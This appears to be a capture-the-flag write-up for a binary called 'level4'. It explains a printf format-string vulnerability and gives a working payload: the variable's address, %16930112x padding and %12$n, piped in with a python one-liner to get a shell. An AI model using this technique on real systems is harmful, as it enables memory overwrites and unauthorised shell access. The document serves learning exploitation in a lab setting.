# LEVEL4

## EXPLANATIONS
### BINARY BEHAVIOR
- 3 Functions : main, p and n   
- main call n()
- n()  
->read 512 char on stdin with fgets and put them in buf  
-> call p(buf)  
--> p call printf with buf (format string)  
-> then cmp the variable \<m\> 0x8049810 and 16930116  
--> if succed the programm call system("/bin/sh")

### EXPLOI STRATEGY
- We are going one again use the format string exploit of printf. 
To do it we are going to write the value 16930116 in m with the identifier %n.  
- The string that we pass threw the stdin will be :  
->0x08049810 ( the address of m)  
-> %16930112x (padding to reach the value)  
->%12\$n (write the value into the address)
### RUN COMMAND
```
python -c "print('\x08\x04\x98\x10'[::-1] + '%16930112x' + '%12\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | /home/user/level4/level4
```